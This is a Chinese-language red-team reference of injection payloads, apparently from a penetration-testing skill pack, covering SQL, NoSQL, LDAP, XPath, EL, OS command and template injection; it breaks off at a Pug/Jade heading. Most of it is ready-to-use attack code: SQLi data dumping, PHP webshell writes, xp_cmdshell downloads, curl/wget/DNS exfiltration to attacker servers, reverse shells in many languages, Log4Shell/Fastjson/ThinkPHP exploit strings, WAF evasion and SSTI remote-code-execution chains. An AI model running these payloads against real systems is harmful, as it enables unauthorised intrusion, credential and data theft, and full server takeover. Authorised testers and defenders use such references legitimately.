# 注入族（SQL / NoSQL / LDAP / XPath / EL / 命令 / SSTI）
> 护网使用：授权、ROE、留痕、报告见 `../hw-rules/`。

---


## SQL 注入实战参考
- WAF 环境下的绕过技巧 → `waf-bypass.md`

> 分类: 检测 → Union注入 → 报错注入 → 盲注(布尔/时间) → 堆叠 → 写文件/读文件 → WAF绕过 → SQLMap

> **last_updated**: 2026-06-04 | **tested_against**: MySQL 5.7/8.0, MSSQL 2019, PostgreSQL 14, Oracle 19c
---

## 1. 检测方法

### 1.1 手工快速检测

```bash
# 基础闭合测试 (参数值后追加)
'       # 单引号 → 报错 = 可能注入点
"       # 双引号
')      # 括号闭合
")      # 双引号+括号
\;      # 转义符测试 (MSSQL/PostgreSQL)
```

**数字型 vs 字符型判断:**
```
?id=1 AND 1=1      # 正常 → 数字型
?id=1' AND '1'='1  # 正常 → 字符型(单引号)
?id=1" AND "1"="1  # 正常 → 字符型(双引号)
```

### 1.2 HTTP 参数位置检测

```
GET参数:    ?id=1'             → URL编码: %27
POST body:  username=admin'    → Content-Type: x-www-form-urlencoded
Cookie:     Cookie: uid=1'     → 常有惊喜
User-Agent: User-Agent: '      → 日志注入 → 二次注入
Referer:    Referer: '         → 同上
JSON:       {"id":"1'"}        → Content-Type: application/json
```

### 1.3 自动化检测

```bash
# SQLMap 全自动检测
sqlmap -u "http://target.com/page.php?id=1" --batch --random-agent

# 指定参数
sqlmap -u "http://target.com/page.php?id=1&cat=2" -p id --batch

# POST 请求
sqlmap -u "http://target.com/login" --data="user=admin&pass=123" --batch

# 从 Burp 文件加载 (推荐)
sqlmap -r request.txt --batch

# 全部参数检测 + 高等级
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --batch
```

---

## 2. UNION 注入 (有回显)

### 2.1 列数探测

```sql
' ORDER BY 1--     # 逐步增加直到报错
' ORDER BY 10--    # 报错 → 列数 = 9
' UNION SELECT NULL--               # 1列
' UNION SELECT NULL,NULL--          # 2列
' UNION SELECT NULL,NULL,NULL--     # 3列...
```

### 2.2 确定回显列位置

```sql
# MySQL/MSSQL
' UNION SELECT 1,2,3,4,5--          # 看页面哪些数字出现

# Oracle (必须带 FROM)
' UNION SELECT 1,2,3,4,5 FROM DUAL--
```

### 2.3 通过回显列读取数据

```sql
# === MySQL ===
' UNION SELECT 1,database(),3,4--           # 当前库名
' UNION SELECT 1,version(),3,4--            # 数据库版本
' UNION SELECT 1,user(),3,4--               # 当前用户
' UNION SELECT 1,@@datadir,3,4--            # 数据目录
' UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata--  # 所有库
' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema='dbname'--
' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,0x3a,password),3,4 FROM users--

# === MSSQL ===
' UNION SELECT 1,DB_NAME(),3,4--
' UNION SELECT 1,@@VERSION,3,4--
' UNION SELECT 1,STRING_AGG(name,','),3,4 FROM sys.databases--
' UNION SELECT 1,STRING_AGG(name,','),3,4 FROM sys.tables--
```

---

## 3. 报错注入 (无回显、有报错)

### 3.1 MySQL 报错注入

```sql
# extractvalue (最长32字符)
' AND extractvalue(1,concat(0x7e,database()))--
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--

# updatexml
' AND updatexml(1,concat(0x7e,database()),1)--

# 突破32字符限制 — 用substring分段
' AND extractvalue(1,concat(0x7e,substring((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),1,32)))--
' AND extractvalue(1,concat(0x7e,substring((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),33,64)))--

# 重复报错 (双查询/floor报错)
' AND (SELECT 1 FROM (SELECT count(*),concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### 3.2 MSSQL 报错注入

```sql
# convert 报错
' AND 1=convert(int,@@version)--

# 子查询报错
' AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')--
```

### 3.3 PostgreSQL 报错注入

```sql
' AND 1=CAST(current_database() AS int)--
' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS int)--
```

---

## 4. 盲注 (无回显、无报错)

### 4.1 布尔盲注

```sql
# === MySQL ===
# 按位猜库名长度
' AND (SELECT LENGTH(database()))>5--       # 正常 → 长度>5
' AND (SELECT LENGTH(database()))=8--       # 正常 → 长度=8

# 逐字符猜库名
' AND (SELECT SUBSTRING(database(),1,1))='a'--    # ASCII方式更稳
' AND ASCII(SUBSTRING(database(),1,1))>100--

# 逐行猜表名
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100--

# 逐行猜列名
' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1))>100--

# 猜数据
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>50--
```

### 4.2 时间盲注 (最通用)

```sql
# === MySQL ===
' AND IF(1=1,SLEEP(3),0)--                   # 延时=可注入
' AND IF((SELECT LENGTH(database()))>5,SLEEP(3),0)--

# === MSSQL ===
'; IF (SELECT COUNT(*) FROM sys.databases)>5 WAITFOR DELAY '0:0:3'--

# === PostgreSQL ===
'; SELECT CASE WHEN (SELECT LENGTH(current_database()))>5 THEN pg_sleep(3) ELSE pg_sleep(0) END--
```

### 4.3 OOB (Out-of-Band / 带外注入)

```sql
# === MySQL DNS带外 (需 root 权限 + secure_file_priv为空) ===
' AND (SELECT LOAD_FILE(CONCAT('\\\\',database(),'.your-dns-server.com\\a.txt')))--

# === MSSQL DNS带外 ===
'; EXEC master.dbo.xp_dirtree '\\\\your-dns-server.com\\a.txt'--
'; EXEC xp_subdirs '\\\\your-dns-server.com\\a'--

# === Oracle DNS带外 ===
' UNION SELECT UTL_HTTP.REQUEST('http://your-server.com/'||(SELECT banner FROM v$version)) FROM DUAL--
```

---

## 5. 堆叠注入 (多语句执行)

> 堆叠注入的核心验证目标是**确认多语句执行能力**，只用无害语句验证（SELECT/延时/版本探测）。严禁任何修改或删除数据的写操作。

```sql
# MySQL (需 PHP MySQLi multi_query / Python pymysql)
'; SELECT database()--                       # 验证多语句执行 + 信息探测
'; SELECT @@version--                        # 版本信息
'; SELECT SLEEP(3)--                         # 延时验证堆叠执行

# MSSQL (默认支持堆叠)
'; SELECT @@version--                        # 版本信息
'; WAITFOR DELAY '0:0:3'--                   # 延时验证堆叠执行
'; SELECT DB_NAME()--                        # 当前库名

# PostgreSQL
'; SELECT pg_sleep(5)--                      # 延时验证堆叠执行
'; SELECT current_database()--               # 当前库名
'; SELECT version()--                        # 版本信息
```

---

## 6. 读写文件

### 6.1 MySQL

```sql
# === 读文件 (需 FILE 权限) ===
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4--
' UNION SELECT 1,LOAD_FILE('C:\\Windows\\win.ini'),3,4--

# 判断权限
' UNION SELECT 1,file_priv,3,4 FROM mysql.user WHERE user=user()--

# === 写文件 — 写Webshell (需 secure_file_priv为空 或 可写目录) ===
' UNION SELECT 1,'<?php @eval($_POST[1]);?>',3,4 INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 1,0x3c3f70687020406576616c28245f504f53545b315d293b3f3e,3,4 INTO DUMPFILE '/var/www/html/shell.php'--  # hex编码防转义

# 查看 secure_file_priv 值
' UNION SELECT 1,@@secure_file_priv,3,4--
# NULL   → 无限制
# /tmp/  → 仅该目录
# (空)   → 禁用
```

### 6.2 MSSQL

```sql
# 启用 xp_cmdshell
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--

# 执行命令
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://yourserver/shell.exe -OutFile C:\temp\shell.exe"'--
'; EXEC xp_cmdshell 'type C:\Windows\win.ini'--
```

---

## 7. WAF 绕过 (SQL注入专用)

### 7.1 关键字绕过

```sql
# 大小写
SELECT → SeLeCt / Select / sElEcT

# 内联注释 (MySQL)
SELECT → /*!50000SELECT*/
UNION  → /*!50000UNION*/

# 双写 (简单WAF)
UNION → UNIUNIONON
FROM  → FRFROMOM

# 等价替换
AND → &&
OR  → ||
=   → LIKE / REGEXP / BETWEEN
空格 → /**/ / %09 / %0a / %0d / %0c / +
```

### 7.2 函数绕过

```sql
# sleep → benchmark
SLEEP(5) → BENCHMARK(5000000,MD5(1))

# information_schema → 无列名注入 (MySQL 5.7+)  
# 不用 information_schema 获取表名
' UNION SELECT 1,group_concat(table_name),3 FROM mysql.innodb_table_stats WHERE database_name=schema()--

# information_schema → sys schema (MySQL 5.7+)
' UNION SELECT 1,group_concat(table_name),3 FROM sys.schema_table_statistics WHERE table_schema=database()--
```

### 7.3 等价函数速查表

| 原始 | 绕过 |
|------|------|
| `MID(str,1,1)` | `SUBSTRING(str,1,1)` / `SUBSTR(str,1,1)` / `LEFT(str,1)` |
| `ASCII('a')` | `ORD('a')` / `UNICODE('a')` |
| `LIMIT 0,1` | `LIMIT 1 OFFSET 0` |
| `COUNT(*)` | `COUNT(1)` / `COUNT(id)` |
| `SLEEP(5)` | `BENCHMARK(100000000,MD5(1))` |
| `@@version` | `VERSION()` |
| `@@datadir` | `@@GLOBAL.datadir` |

### 7.4 宽字节注入 (GBK 绕过转义)

```sql
# 条件: 后端用 addslashes() 转义 ' → \'，且数据库连接字符集为 GBK
# %df 与转义符 \ (%5c) 组合成合法汉字 → 单引号逃逸
?id=1%df' AND 1=1--+
?id=1%df' UNION SELECT 1,user(),3--+
# 其他首字节候选: %bf %a1 %de (取决于字符集)
```

### 7.5 仍被拦截？

加载 `waf-bypass.md`，按 §11 分层流程逐层打: 编码(单→双) → 大小写/注释 → HPP → 分块传输 → Content-Type 切换 → 协议走私 → IP 伪造。
SQLMap 组合: `--tamper=space2comment,randomcase,between,charencode --random-agent`。

---

## 8. 常用 SQLMap 参数

```bash
# === 基础 ===
sqlmap -u "URL" --batch --random-agent                    # 自动化
sqlmap -u "URL" --dbs                                     # 列库
sqlmap -u "URL" -D dbname --tables                        # 列表
sqlmap -u "URL" -D dbname -T users --columns              # 列字段
sqlmap -u "URL" -D dbname -T users -C user,pass --dump    # 拖数据

# === 高级 ===
sqlmap -u "URL" --os-shell                                # 系统SHELL (需权限)
sqlmap -u "URL" --file-read "/etc/passwd"                 # 读文件
sqlmap -u "URL" --file-write "shell.php" --file-dest "/var/www/html/shell.php"  # 写文件
sqlmap -u "URL" --tamper=space2comment --tamper=randomcase  # tamper绕过

# === 常用tamper ===
# space2comment   → 空格替换为 /**/
# randomcase      → 随机大小写
# charunicodeencode → Unicode编码
# charencode      → URL编码
# versionedmorekeywords → MySQL内联注释
# between         → > < 替换为 BETWEEN

# === 请求模板 ===
sqlmap -r request.txt --batch --level=3                   # 从文件加载
sqlmap -r request.txt --batch --level=5 --risk=3 --tamper=space2comment,randomcase  # 全开
```

---

## 9. 各数据库特征速查

| 特征 | MySQL | MSSQL | PostgreSQL | Oracle |
|------|-------|-------|------------|--------|
| 注释 | `--` `#` `/**/` | `--` `/**/` | `--` `/**/` | `--` `/**/` |
| 字符串连接 | `CONCAT()` / `||` | `+` | `\|\|` | `\|\|` |
| 版本函数 | `@@version` `VERSION()` | `@@VERSION` | `VERSION()` | `v$version` |
| 库/用户 | `database()` `user()` | `DB_NAME()` `SYSTEM_USER` | `current_database()` `current_user` | `SYS.DATABASE_NAME` |
| 元数据表 | `information_schema` | `information_schema` | `information_schema` | `ALL_TABLES` |
| 报错注入 | extractvalue/updatexml/floor | convert/子查询 | CAST | CTXSYS/UTL_INADDR |
| 堆叠查询 | 需多语句支持 | 原生支持 | 原生支持 | 有限支持 |
| 命令执行 | UDF/OUTFILE | xp_cmdshell | COPY/程序语言 | Java存储过程 |
| DNS带外 | LOAD_FILE | xp_dirtree/xp_subdirs | 需dblink扩展 | UTL_HTTP/UTL_INADDR |

---
## 相关参考
- WAF 环境下的绕过技巧 → `waf-bypass.md`

*参考: OWASP SQL Injection Cheat Sheet + WooYun 实战案例整理*


---

## 扩展注入实战参考（NoSQL / LDAP / XPath / EL）

> 补 SQL 注入之外的注入家族。检测逻辑与 SQLi 相同：**确认可控输入进入了解析器并改变了语义**。
> 报告门槛与 SQLi 一致：必须提取到数据或绕过认证，仅报错不报。

## 1. NoSQL 注入（MongoDB 为主）

### 1.1 识别
- 指纹：响应含 `MongoError`/`BSON`；API 为 JSON 格式（Node.js/Express + Mongoose 高发）
- 快速探针：`?q[$ne]=1` / `{"$gt":""}` / 单引号观察报错差异

### 1.2 认证绕过（🔴高危，最常见）

```bash
# === URL 参数形式 ===
POST /login
username[$ne]=invalid&password[$ne]=invalid

# === JSON 形式 ===
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":{"$regex":"^admin"},"password":{"$ne":""}}

# 验证标准：实际登录成功进入后台/拿到 Token，不是仅返回 200
```

### 1.3 数据提取（布尔/时间盲注）

```bash
# === $regex 逐字符提取密码/Token ===
{"username":"admin","password":{"$regex":"^a"}}     → 响应差异
{"username":"admin","password":{"$regex":"^ab"}}    → 逐位推进

# === $where 时间盲注（需服务端启用 JS 求值）===
{"username":"admin","$where":"this.password.match(/^a/)&&sleep(3000)||true"}

# 自动化:
python3 nosqli-user-pass-enum.py -u http://<target>/login -up username -pp password
# 或 Burp Intruder: 字符集 a-z0-9 → 按响应长度聚类
```

### 1.4 操作符速查
| 操作符 | 用途 |
|--------|------|
| `$ne` / `$gt` / `$regex` | 认证绕过、数据枚举 |
| `$where` | JS 注入 → 时间盲注/数据提取（多数默认禁用） |
| `$lookup` | 跨集合联合查询（聚合接口） |

## 2. LDAP 注入

### 2.1 识别与检测
- 场景：企业 SSO/AD 登录、目录搜索接口；报错含 `javax.naming` / `LDAP` / `Bad search filter`
- 探针：`*` / `)(|` / `%00` 观察响应差异

```bash
# === 认证绕过 ===
username=admin)(&)            # 拼成 (&(uid=admin)(&))(password=任意) → 恒真
username=*)(uid=*))(|(uid=*   # 通配绕过

# === 属性枚举 ===
*)(uid=*))(|(uid=a*           # 逐字符爆破用户名（响应差异）
```

## 3. XPath 注入

- 场景：XML 后端存储的老系统；报错含 `XPath` / `System.Xml`
- 认证绕过: `' or 1=1 or ''='` → `//user[name/text()='' or 1=1 or ''='' and pass...]`
- 盲注枚举: `' or substring(//user[1]/pass,1,1)='a` → 逐字符提取

## 4. 表达式语言注入（EL/OGNL/SpEL）

- 场景：Java 富客户端/框架参数；`${...}` `#{...}` 被服务端求值
- 与 SSTI 的区别：模板引擎之外的原生表达式求值，常出在参数名/头/错误页

```bash
# === 检测探针 ===
${7*7} / #{7*7} / ${{7*7}}        → 响应出现 49 即确认
*{7*7}                            # OGNL (Struts2)

# === RCE ===
#{T(java.lang.Runtime).getRuntime().exec('id')}     # SpEL
@java.lang.Runtime@getRuntime().exec('id')          # OGNL
```

> ⚠️ Struts2/Confluence 等 OGNL RCE 多为历史漏洞 — 优先走 SKILL.md Step 2a 指纹匹配流程，用公开 PoC 验证

## 相关参考

- SQL 注入全技法 → `injection.md`
- 模板注入 SSTI → `injection.md`（模板引擎求值）
- NoSQL 鉴权绕过速查 → `auth-idor.md §7.1`


---

## 命令执行 (RCE) 实战参考

> 更完整的命令执行、无回显、反弹 shell、应用 RCE、RCE 链见 `rce.md`。
- WAF 环境下的命令混淆绕过 → `waf-bypass.md`
- SQL 注入写 Webshell → `injection.md §6`
- 文件上传获取 Webshell → `file-upload.md`

> 分类: 命令注入检测 → 无回显 → 不出网 → 反弹Shell → 常见应用RCE → 绕过

> **last_updated**: 2026-06-04 | **tested_against**: Bash 5.x, PHP 8.x, Python 3.11, Java 17
---

## 1. 命令注入检测

### 1.1 基础检测 Payload

```bash
# === 拼接执行，检测回显 ===
; id
| id
|| id
& id
&& id
`id`
$(id)
%0a id      # 换行注入
%0d%0a id   # CRLF注入

# === 延时检测 (无回显时) ===
; sleep 5
| ping -c 5 127.0.0.1
& ping -n 5 127.0.0.1     # Windows
```

### 1.2 常见注入位置

```
ping 功能页:    target=127.0.0.1;id
文件上传路径:   filename=|id|
SMTP 邮件注入:  收件人/主题/正文 含命令拼接
nslookup:       domain=example.com;id
PDF/图片处理:   文件名参数可能传参给系统命令
```

---

## 2. 无回显 — 数据外带

### 2.1 DNS 外带 (最常用)

```bash
# === Linux ===
; nslookup $(whoami).your-dns-server.com
; wget http://your-server/$(whoami)
; curl http://your-server/$(cat /etc/passwd|base64)

# === Windows ===
& nslookup %USERNAME%.your-dns-server.com
& certutil -urlcache -split -f http://your-server/%COMPUTERNAME%
```

### 2.2 HTTP 外带

```bash
# Linux
; curl http://your-server/$(id|base64)
; wget http://your-server/$(cat /flag|base64) -O /dev/null

# 单行Python
; python3 -c "import requests;requests.get('http://your-server/'+__import__('os').popen('id').read().strip())"
```

---

## 3. 不出网 — 时间盲注 + 写文件

### 3.1 时间盲注 (逐字符外带)

```bash
# 逐字符判断
; if [ $(whoami|cut -c1) = 'r' ]; then sleep 3; fi
& if "%USERNAME:~0,1%"=="A" (ping -n 3 127.0.0.1)

# 逐字符外带脚本思路 (按位判断后拼接)
# for i in $(seq 1 32); do
#   curl "http://target/cmd?id=;if [ \$(cat /flag|cut -c$i) = 'f' ];then sleep 3;fi"
# done
```

### 3.2 写文件到 Web 目录 (最稳定)

```bash
# 写入 Web 目录后浏览器访问
; echo '<?php @eval($_POST[1]);?>' > /var/www/html/s.php
; printf '<?=system($_GET[1])?>' > /var/www/html/s.php

# 追加写入
; echo '<?=file_get_contents("/flag")?>' >> /var/www/html/readflag.php
```

---

## 4. 反弹 Shell 大全

### 4.1 Bash

```bash
# 基础版
bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1

# URL编码版 (通过GET/POST传参时用)
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261

# Base64编码执行 (绕过特殊字符过滤)
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | base64
# 执行:
echo <base64_string> | base64 -d | bash
```

### 4.2 Python

```python
# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# 简化版 (需 pty)
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Python3 一行外带命令结果 (替代反弹)
python3 -c "import urllib.request;exec(urllib.request.urlopen('http://10.0.0.1/rev.txt').read().decode())"
```

### 4.3 PHP

```php
# system
php -r '$sock=fsockopen("10.0.0.1",4444);system("/bin/sh -i <&3 >&3 2>&3");'

# exec
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# 单行 (无 &3 问题)
php -r 'exec("/bin/bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"");'
```

### 4.4 Netcat (nc)

```bash
# 传统 netcat (含 -e)
nc -e /bin/sh 10.0.0.1 4444

# OpenBSD netcat (不含 -e)
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f

# ncat
ncat 10.0.0.1 4444 -e /bin/sh
```

### 4.5 PowerShell (Windows)

```powershell
# 基础反弹
powershell -c "$client=New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.UTF8Encoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([System.Text.Encoding]::UTF8).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# 编码执行 (绕过特殊字符)
powershell -ep bypass -enc <BASE64_ENCODED_SHELL>
```

### 4.6 其他语言

```bash
# === Perl ===
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# === Ruby ===
ruby -rsocket -e 'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# === Lua ===
lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('10.0.0.1',4444);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"

# === Golang ===
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go
```

---

## 5. 监听端设置

```bash
# nc 监听
nc -lvnp 4444

# pwncat-cs (推荐 - 自动升级tty)
pwncat-cs -lp 4444

# metasploit
msfconsole -q -x "use multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"

# socat (加密)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
socat OPENSSL-LISTEN:4444,cert=cert.pem,key=key.pem,verify=0 EXEC:/bin/bash
```

### 反弹后 TTY 升级

```bash
# 进入后第一件事
python3 -c 'import pty;pty.spawn("/bin/bash")'    # TTY shell
# Ctrl+Z 挂起
stty raw -echo; fg                                 # 传递终端控制
export TERM=xterm                                  # 终端类型
```

---

## 6. 常见应用 RCE 速查

### 6.1 Struts2

```
# S2-001 ~ S2-062, 常见检测:
/struts2-showcase/actionChain1.action
→ OGNL %{(#_memberAccess['allowStaticMethodAccess']=true).(#cmd='id').(#ret=@java.lang.Runtime@getRuntime().exec(#cmd).getInputStream())...}
```

### 6.2 ThinkPHP

```
# ThinkPHP 5.0.23 RCE
http://target.com/index.php?s=captcha
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id

# ThinkPHP 5.1.x/5.2.x
http://target.com/index.php?s=index/\think\Request/input&filter=system&data=id
```

### 6.3 Fastjson

```
# Fastjson <=1.2.80
{"@type":"java.net.Inet4Address","val":"your-dns.dnslog.com"}
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://your-server/Exploit","autoCommit":true}
```

### 6.4 Log4j (Log4Shell)

```
# JNDI 注入
${jndi:ldap://your-server/a}
${${lower:j}ndi:ldap://your-server/a}
${${::-j}${::-n}${::-d}${::-i}:ldap://your-server/a}
```

### 6.5 Shiro (RememberMe)

```
# Cookie: rememberMe=xxx
# → 识别特征: Set-Cookie 含 rememberMe=deleteMe
# → shiro_attack 工具利用
```

---

## 7. WAF/参数过滤绕过

### 7.1 命令分隔符绕过

```bash
# 空格过滤
;{cat,/flag}         # {} 包裹
;cat$IFS/flag         # IFS (内部字段分隔符)
;cat</flag             # 重定向输入
;cat<>/flag            # 读写重定向

# ; | & 过滤
%0a                    # 换行
%0d%0a                 # CRLF
`id`                   # 命令替换
$(id)                  # 命令替换

# 关键词过滤 (cat → 替代)
cat → tac / more / less / head / tail / nl / od / xxd / strings / rev
```

### 7.2 通配符绕过

```bash
# / 过滤
cat${HOME:0:1}flag    # ${HOME:0:1} = /
cat$(echo . | tr '!-0' '"-1')flag  # . 字符偏移得到 /

# 路径拼接
/bin/cat /flag → /b'in'/'c'a't /f'l'ag
```

### 7.3 编码绕过

```bash
# Hex
echo '636174202f666c6167' | xxd -r -p | bash    # cat /flag 的hex

# Base64
echo 'Y2F0IC9mbGFn' | base64 -d | bash

# Octal
$'\143\141\164' /flag                            # cat = \143\141\164
```

---
## 相关参考
- WAF 环境下的命令混淆绕过 → `waf-bypass.md`
- SQL 注入写 Webshell → `injection.md §6`
- 文件上传获取 Webshell → `file-upload.md`

*参考: PayloadAllTheThings + GTFO Bins + 实战案例整理*


---

## SSTI 模板注入实战参考
- 模板注入 RCE 后渗透 → `../post/linux-privesc.md` / `../post/windows-privesc.md`
- WAF 绕过 Payload 编码 → `waf-bypass.md`

> 分类: 检测 → Jinja2 → Twig → FreeMarker → Velocity → Smarty → Jade → 沙箱绕过

> **last_updated**: 2026-06-04 | **tested_against**: Jinja2, Twig, FreeMarker, Velocity, Smarty, ERB
---

## 1. SSTI 检测

### 1.1 通用检测 Payload

```python
# 按模板引擎分组检测:

# === 通用 (数学运算 — 最简单) ===
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}

# === 多形式尝试 ===
{{7*'7'}}        # Jinja2 → 7777777, Twig → 49
{{config}}        # Flask/Jinja2 → 配置对象
{{self}}          # Jinja2 → TemplateReference
${7*7}            # FreeMarker
#{}               # Pug/Jade
```

### 1.2 按引擎精确识别

| Payload | 引擎 | 预期输出 |
|---------|------|---------|
| `{{7*7}}` | Jinja2/Twig | 49 |
| `${7*7}` | FreeMarker | 49 |
| `#{7*7}` | Thymeleaf/Jade | 49 |
| `<%= 7*7 %>` | ERB/EJS | 49 |
| `{{= 7*7}}` | doT | 49 |

---

## 2. Jinja2 (Python / Flask)

### 2.1 信息收集

```python
# === 基础信息 ===
{{config}}                         # Flask 配置对象
{{self._TemplateReference__context}}  # 内部变量
{{''.__class__}}                   # <class 'str'>
{{''.__class__.__mro__}}           # 继承链

# === 全局变量 ===
{{''.__class__.__mro__[1].__subclasses__()}}  # 所有子类

# === 找可利用的子类 ===
{{''.__class__.__mro__[1].__subclasses__()[<index>]}}  # 遍历找 <class 'subprocess.Popen'>
```

### 2.2 RCE (Jinja2 经典链)

```python
# === 方式1: subprocess.Popen (最常用) ===
# Step 1: 找到 Popen 的索引
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
{% if c.__name__ == 'Popen' %}{{ loop.index0 }}{% endif %}
{% endfor %}

# Step 2: RCE
{{''.__class__.__mro__[1].__subclasses__()[<POPEN_INDEX>]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# === 方式2: os.popen (更短) ===
{{''.__class__.__mro__[1].__subclasses__()[<os._wrap_close索引>].__init__.__globals__['os'].popen('id').read()}}

# === 方式3: __builtins__ ===
{{''.__class__.__mro__[1].__subclasses__()[<索引>].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}

# === 方式4: lipsum (Flask/Jinja2 内置) ===
{{lipsum.__globals__['os'].popen('id').read()}}
{{lipsum.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

# === 方式5: cycler (Flask/Jinja2内置) ===
{{cycler.__init__.__globals__.os.popen('id').read()}}

# === 方式6: url_for (Flask内置) ===
{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}
```

### 2.3 绕过过滤

```python
# === [] 被过滤 → 用 .__getitem__() / |attr() ===
{{''.__class__.__mro__.__getitem__(1).__subclasses__()}}

# === . 被过滤 → 用 |attr() ===
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()}}

# === __ 被过滤 → 用 \x5f\x5f 或 request.args ===
{{''.__class__}}                        # 原始
{{''\x5f\x5fclass\x5f\x5f}}            # hex 表示
{{''[request.args.a]}}                  # a=__class__ (参数)

# === 引号被过滤 → request 对象 ===
{{lipsum.__globals__[request.args.os]}}   # ?os=os
{{lipsum.__globals__[request.args.os].popen(request.args.cmd).read()}}  # ?os=os&cmd=id

# === 关键字过滤 (config/os/popen) → 字符串拼接 ===
{{''.__class__.__mro__[1].__subclasses__()[x].__init__.__globals__['o'+'s'].popen('id')}}
{{lipsum.__globals__['so'.replace('s','o')]}}  # → 'os'

# === 数字被过滤 ===
{{(1+1)}}                    # 计数
{{dict(a=1)|length}}          # 1
{{[0]|length}}                # 1
```

---

## 3. Twig (PHP)

### 3.1 信息收集

```php
{{_self}}             # 当前模板信息
{{_charset}}          # 字符集
{{dump(app)}}         # Symfony应用对象

# 遍历全局变量
{% for key, value in _context %}{{key}}:{{value}}
{% endfor %}
```

### 3.2 RCE

```php
# === Twig 1.x (registerUndefinedFunctionCallback) ===
{{_self.env.registerUndefinedFunctionCallback("system")}}
{{_self.env.getFunction("system")("id")}}

# === Twig 2.x / 3.x ===
{{['id']|filter('system')}}                     # filter 可调系统函数
{{['cat /etc/passwd']|filter('system')}}

# === Symfony 环境 ===
{{app.request.server.all|join(',')}}             # 环境变量
{{app.request.headers.all|join(',')}}            # headers

# === 绕过方式 ===
{{['id']|filter('s'~'y'~'s'~'t'~'e'~'m')}}    # 拼接绕过
```

---

## 4. FreeMarker (Java)

### 4.1 检测

```java
${7*7}                # → 49
${"freemarker".toUpperCase()}  # → FREEMARKER
```

### 4.2 RCE

```java
# === FreeMarker 经典RCE ===
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

# === ObjectConstructor ===
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id".split(" ")).start()}

# === JythonRuntime ===
${"freemarker.template.utility.JythonRuntime"?new()("__import__('os').popen('id').read()")}
```

---

## 5. Velocity (Java)

```java
# === RCE ===
#set($s="")
#set($stringClass=$s.getClass())
#set($rt=$stringClass.forName("java.lang.Runtime"))
#set($exec=$rt.getRuntime().exec("id"))
$exec.waitFor()
#set($out=$exec.getInputStream())
#foreach($i in [1..$out.available()])$out.read()#end
```

---

## 6. Pug / Jade (Node.js)

```javascript
// === RCE ===
